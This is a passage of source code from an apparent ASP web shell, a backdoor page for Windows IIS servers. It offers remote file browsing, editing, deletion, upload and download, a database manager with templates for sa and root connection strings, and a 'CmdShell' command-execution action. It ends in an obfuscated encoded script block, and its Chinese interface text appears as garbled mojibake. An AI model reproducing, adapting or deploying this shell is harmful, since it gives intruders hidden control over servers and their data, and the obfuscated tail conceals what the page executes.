           DName = prompt("ÇëÊäÈëÒªÐÂ½¨µÄÎÄ¼þ¼ÐÈ«Ãû³Æ",FName);
           top.hideform.FName.value = DName;
       }else if(FAction=="CreateMdb"){
           DName = prompt("ÇëÊäÈëÒªÐÂ½¨µÄMdbÎÄ¼þÈ«Ãû³Æ,×¢Òâ²»ÄÜÍ¬Ãû£¡",FName);
           top.hideform.FName.value = DName;
       }else if(FAction=="CompactMdb"){
           DName = prompt("ÇëÊäÈëÒªÑ¹ËõµÄMdbÎÄ¼þÈ«Ãû³Æ,×¢ÒâÎÄ¼þÊÇ·ñ´æÔÚ£¡",FName);
           top.hideform.FName.value = DName;
       }else{
           DName = "Other";
       }

       if(DName!=null){
         top.hideform.Action.value = FAction;
         top.hideform.submit();
       }else{
         top.hideform.FName.value = "";
       }
     }

     function DbCheck(){
       if(DbForm.DbStr.value == ""){
         alert("ÇëÏÈÁ¬½ÓÊý¾Ý¿â");
         FullDbStr(0);
         return false;
       }
       return true;
     }

     function FullDbStr(i){
      if(i<0){
        return false;
      }
       Str = new Array(12);
       Str[0] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=<%=RePath(Session("FolderPath"))%>\\db.mdb;Jet OLEDB:Database Password=***";
       Str[1] = "Driver={Sql Server};Server=<%=ServerIP%>,1433;Database=DbName;Uid=sa;Pwd=****";
       Str[2] = "Driver={MySql};Server=<%=ServerIP%>;Port=3306;Database=DbName;Uid=root;Pwd=****";
       Str[3] = "Dsn=DsnName";
       Str[4] = "SELECT * FROM [TableName] WHERE ID<100";
       Str[5] = "INSERT INTO [TableName](USER,PASS) VALUES(\'username\',\'password\')";
       Str[6] = "DELETE FROM [TableName] WHERE ID=100";
       Str[7] = "UPDATE [TableName] SET USER=\'username\' WHERE ID=100";
       Str[8] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";
       Str[9] = "DROP TABLE [TableName]";
       Str[10]= "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";
       Str[11]= "ALTER TABLE [TableName] DROP COLUMN PASS";
       Str[12]= "µ±Ö»ÏÔÊ¾Ò»ÌõÊý¾ÝÊ±¼´¿ÉÏÔÊ¾×Ö¶ÎµÄÈ«²¿×Ö½Ú£¬¿ÉÓÃÌõ¼þ¿ØÖÆ²éÑ¯ÊµÏÖ.\n³¬¹ýÒ»ÌõÊý¾ÝÖ»ÏÔÊ¾×Ö¶ÎµÄÇ°ÎåÊ®¸ö×Ö½Ú¡£";
       if(i<=3){
         DbForm.DbStr.value = Str[i];
         DbForm.SqlStr.value = "";
         abc.innerHTML="<center>ÇëÈ·ÈÏ¼ºÁ¬½ÓÊý¾Ý¿âÔÙÊäÈëSQL²Ù×÷ÃüÁîÓï¾ä¡£</center>";
       }else if(i==12){
         alert(Str[i]);
       }else{
         DbForm.SqlStr.value = Str[i];
       }
       return true;
     }


     function FullSqlStr(str,pg){
       if(DbForm.DbStr.value.length<5){
         alert("Çë¼ì²éÊý¾Ý¿âÁ¬½Ó´®ÊÇ·ñÕýÈ·!")
         return false;
       }
       if(str.length<10){
         alert("Çë¼ì²éSQLÓï¾äÊÇ·ñÕýÈ·!")
         return false;
       }
       DbForm.SqlStr.value = str ;
       DbForm.Page.value = pg;
       abc.innerHTML="";
       DbForm.submit();
       return true;
     }
   </script>
   </head>
   <%
   Dim T1
   Class UPC
     Dim D1,D2

     Public Function Form(F)
       F=lcase(F)
       If D1.exists(F) then:Form=D1(F):else:Form="":end if
     End Function

     Public Function UA(F)
       F=lcase(F)
       If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if
     End Function

     Private Sub Class_Initialize
     Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName
       set D1=CreateObject(ObT(4,0))
       if Request.TotalBytes<1 then Exit Sub
       set T1 = CreateObject(ObT(6,0))
       T1.Type = 1 : T1.Mode =3 : T1.Open
       T1.Write  Request.BinaryRead(Request.TotalBytes)
       T1.Position=0 : TDa =T1.Read : DStart = 1
       DEnd = LenB(TDa)
       set D2=CreateObject(ObT(4,0))
       vbCrlf = chrB(13) & chrB(10)
       set T2 = CreateObject(ObT(6,0))
       TSt = MidB(TDa,1, InStrB(DStart,TDa,vbCrlf)-1)
       TLen = LenB (TSt)
       DStart=DStart+TLen+1
       while (DStart + 10) < DEnd
         DIEnd = InStrB(DStart,TDa,vbCrlf & vbCrlf)+3
         T2.Type = 1 : T2.Mode =3 : T2.Open
         T1.Position = DStart
         T1.CopyTo T2,DIEnd-DStart
         T2.Position = 0 : T2.Type = 2 : T2.Charset ="gb2312"
         TIn = T2.ReadText : T2.Close
         DStart = InStrB(DIEnd,TDa,TSt)
         FStart = InStr(22,TIn,"name=""",1)+6
         FEnd = InStr(FStart,TIn,"""",1)
         UpName = lcase(Mid (TIn,FStart,FEnd-FStart))
         if InStr (45,TIn,"filename=""",1) > 0 then
           set TFL=new FIF
           FStart = InStr(FEnd,TIn,"filename=""",1)+10
           FEnd = InStr(FStart,TIn,"""",1)
           FStart = InStr(FEnd,TIn,"Content-Type: ",1)+14
           FEnd = InStr(FStart,TIn,vbCr)
           TFL.FileStart =DIEnd
           TFL.FileSize = DStart -DIEnd -3
           if not D2.Exists(UpName) then
             D2.add UpName,TFL
           end if
         else
           T2.Type =1 : T2.Mode =3 : T2.Open
           T1.Position = DIEnd : T1.CopyTo T2,DStart-DIEnd-3
           T2.Position = 0 : T2.Type = 2
           T2.Charset ="gb2312"
           SFV = T2.ReadText
           T2.Close
           if D1.Exists(UpName) then
             D1(UpName)=D1(UpName)&", "&SFV
           else
             D1.Add UpName,SFV
           end if
         end if
         DStart=DStart+TLen+1
       wend
       TDa=""
       set T2 =nothing
     End Sub

     Private Sub Class_Terminate
       if Request.TotalBytes>0 then
         D1.RemoveAll:D2.RemoveAll
         set D1=nothing:set D2=nothing
         T1.Close:set T1 =nothing
       end if
     End Sub
   End Class

   Class FIF
   dim FileSize,FileStart
     Private Sub Class_Initialize
     FileSize = 0
     FileStart= 0
     End Sub

     Public function SaveAs(F)
     dim T3
     SaveAs=true
     if trim(F)="" or FileStart=0 then exit function
     set T3=CreateObject(ObT(6,0))
        T3.Mode=3 : T3.Type=1 : T3.Open
        T1.position=FileStart
        T1.copyto T3,FileSize
        T3.SaveToFile F,2
        T3.Close
        set T3=nothing
        SaveAs=false
      end function
   End Class


   Class LBF
     Dim CF
     Private Sub Class_Initialize
       SET CF=CreateObject(ObT(0,0))
     End Sub

     Private Sub Class_Terminate
       Set CF=Nothing
     End Sub

     Function ShowDriver()
       For Each D in CF.Drives
         SI=SI&"<tr><td height='20'>&nbsp;&nbsp;"
         SI=SI&IsIco("plus.gif","driver.gif","v")
         SI=SI&"<a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>±¾µØ´ÅÅÌ ("&D.DriveLetter&":)</a>"
         SI=SI&"</td></tr>"
       Next
       ShowDriver=SI
     End Function

     Function FileIco(FName)
     If ShowFileIco=true Then
       TypeList = ".asp.asa.bat.bmp.com.doc.db.dll.exe.fla.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls.xml.zip"
       FileType = lcase(Mid(FName, InstrRev(FName,".")+1))
       If Instr(TypeList,"."&FileType)>0 then
         Ico = FileType&".gif"
       Else
         Ico = "default.gif"
       End If

       FileIco = "<img src='"&IcoPath&Ico&"' border='0'> "
     Else
       FileIco="<font face='wingdings' color='#006600' size='3'>2</font> "
     End If
     End Function

     Function ShowFile(Path)
     Set FOLD=CF.GetFolder(Path)
     i=0
       SI="<table width='100%'  border='0' cellspacing='0' cellpadding='0' bgcolor='#EFEFEF'><tr>"
     For Each F in FOLD.subfolders
       SI=SI&"<td>"
       SI=SI&IsIco("","folder.gif","0")
       SI=SI&" <a href='javascript:ShowFolder("""&RePath(Path&"\"&F.Name)&""")'>"&F.Name&"</a>"
       SI=SI&" | <a href='javascript:FullForm("""&Replace(Path&"\"&F.Name,"\","\\")&""",""DelFolder"")'  onclick='return yesok()' class='am' title='É¾³ý'>D</a>"
       SI=SI&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""CopyFolder"")'  onclick='return yesok()' class='am' title='¸´ÖÆ'>C</a>"
       SI=SI&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""MoveFolder"")'  onclick='return yesok()' class='am' title='ÒÆ¶¯'>M</a>"
       i=i+1
       If i mod 3 = 0 then SI=SI&"</tr><tr>"
     Next
       SI=SI&"</tr><tr><td height=5></td></tr></table>"
       Response.Write SI : SI=""

     For Each L in Fold.files
       SI="<table width='100%'  border='0' cellspacing='1' cellpadding='0'>"
       SI=SI&"<tr onMouseOver=""this.className='tr'"" onMouseOut=""this.className=''"">"
       SI=SI&"<td height='20'>"&FileIco(L.Name)
       SI=SI&"<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DownFile"");' title='ÏÂÔØ'>"&L.Name&"</a></td>"
       SI=SI&"<td width='140'>"&L.Type&"</td>"
       SI=SI&"<td width='50'>"&clng(L.size/1024)&"K</td>"
       SI=SI&"<td width='120'>"&L.DateLastModified&"</td>"
       SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""EditFile"")' class='am' title='±à¼'>edit</a></td>"
       SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DelFile"")'  onclick='return yesok()' class='am' title='É¾³ý'>del</a></td>"
       SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""CopyFile"")' class='am' title='¸´ÖÆ'>copy</a></td>"
       SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""MoveFile"")' class='am' title='ÒÆ¶¯'>move</a></td>"
       SI=SI&"</tr></table>"
       Response.Write SI : SI=""
     Next
     Set FOLD=Nothing
     End function

     Function DelFile(Path)
       If CF.FileExists(Path) Then
         CF.DeleteFile Path
         SI="<center><br><br><br>ÎÄ¼þ "&Path&" É¾³ý³É¹¦£¡</center>"
         SI=SI&BackUrl
         Response.Write SI
       End If
     End Function

     Function EditFile(Path)
     If Request("Action2")="Post" Then
         Set T=CF.CreateTextFile(Path)
           T.WriteLine Request.form("content")
           T.close
         Set T=nothing
       SI="<center><br><br><br>ÎÄ¼þ±£´æ³É¹¦£¡</center>"
       SI=SI&BackUrl
       Response.Write SI
       Response.End
     End If

     If Path<>"" Then
       Set T=CF.opentextfile(Path, 1, False)
       Txt=HTMLEncode(T.readall)
       T.close
       Set T=Nothing
     Else
       Path=Session("FolderPath")&"\newfile.asp":Txt="ÐÂ½¨ÎÄ¼þ"
     End If

     SI="<table width='100%' height='100%'><tr><td valign='top' align='center'>"
     SI=SI&"<Form action='"&URL&"?Action2=Post' method='post' name='EditForm'>"
     SI=SI&"<input name='Action' value='EditFile' Type='hidden'>"
     SI=SI&"<input name='FName' value='"&Path&"' style='width:100%'><br>"
     SI=SI&"<textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br>"
     SI=SI&"<hr><input name='goback' type='button' value='·µ»Ø' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='ÖØÖÃ'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='±£´æ'></form>"
     SI=SI&"</td></tr></table></body></html>"
     Response.Write SI
     End Function

     Function CopyFile(Path)
     Path = Split(Path,"||||")
       If CF.FileExists(Path(0)) and Path(1)<>"" Then
         CF.CopyFile Path(0),Path(1)
         SI="<center><br><br><br>ÎÄ¼þ"&Path(0)&"¸´ÖÆ³É¹¦£¡</center>"
         SI=SI&BackUrl
         Response.Write SI
       End If
     End Function

     Function MoveFile(Path)
     Path = Split(Path,"||||")
       If CF.FileExists(Path(0)) and Path(1)<>"" Then
         CF.MoveFile Path(0),Path(1)
         SI="<center><br><br><br>ÎÄ¼þ"&Path(0)&"ÒÆ¶¯³É¹¦£¡</center>"
         SI=SI&BackUrl
         Response.Write SI
       End If
     End Function

     Function DelFolder(Path)
       If CF.FolderExists(Path) Then
         CF.DeleteFolder Path
         SI="<center><br><br><br>Ä¿Â¼"&Path&"É¾³ý³É¹¦£¡</center>"
         SI=SI&BackUrl
         Response.Write SI
       End If
     End Function

     Function CopyFolder(Path)
     Path = Split(Path,"||||")
       If CF.FolderExists(Path(0)) and Path(1)<>"" Then
         CF.CopyFolder Path(0),Path(1)
         SI="<center><br><br><br>Ä¿Â¼"&Path(0)&"¸´ÖÆ³É¹¦£¡</center>"
         SI=SI&BackUrl
         Response.Write SI
       End If
     End Function

     Function MoveFolder(Path)
     Path = Split(Path,"||||")
       If CF.FolderExists(Path(0)) and Path(1)<>"" Then
         CF.MoveFolder Path(0),Path(1)
         SI="<center><br><br><br>Ä¿Â¼"&Path(0)&"ÒÆ¶¯³É¹¦£¡</center>"
         SI=SI&BackUrl
         Response.Write SI
       End If
     End Function

     Function NewFolder(Path)
       If Not CF.FolderExists(Path) and Path<>"" Then
         CF.CreateFolder Path
         SI="<center><br><br><br>Ä¿Â¼"&Path&"ÐÂ½¨³É¹¦£¡</center>"
         SI=SI&BackUrl
         Response.Write SI
       End If
     End Function
   End Class


   Select Case Action
     Case "MainMenu":MainMenu()
     Case "ShowFile"
       Set ABC=New LBF:ABC.ShowFile(Session("FolderPath")):Set ABC=Nothing
     Case "DownFile":DownFile FName:ShowErr()
     Case "DelFile"
       Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing
     Case "EditFile"
       Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing
     Case "CopyFile"
       Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing
     Case "MoveFile"
       Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing
     Case "DelFolder"
       Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing
     Case "CopyFolder"
       Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing
     Case "MoveFolder"
       Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing
     Case "NewFolder"
       Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing
     Case "UpFile":UpFile()
     Case "CmdShell":CmdShell()
     Case "Logout":Session.Contents.Remove("webadmin"):Response.Redirect URL
     Case "CreateMdb":CreateMdb FName
     Case "CompactMdb":CompactMdb FName
     Case "DbManager":DbManager()
     Case "Course":Course()
     C 0KJ)U+M-+MqU0K`b@#@&PP;C/ P2^dnPtlbxoW.hv#@#@&AUN,?ns mY@#@&UtGhA.M`b@#@&KEMLAA==^#~@%>
